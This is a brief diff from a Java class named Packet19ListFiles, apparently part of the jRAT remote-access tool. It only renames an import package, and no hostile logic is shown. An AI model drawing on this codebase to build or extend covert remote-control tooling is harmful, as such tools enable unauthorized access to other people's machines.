@@ -5,7 +5,8 @@ import java.io.File;
 import java.util.Calendar;
 import java.util.Date;
 
-import com.redpois0n.common.io.StringWriter;
+import pro.jrat.common.io.StringWriter;
+
 
 public class Packet19ListFiles extends AbstractOutgoingPacket {
 
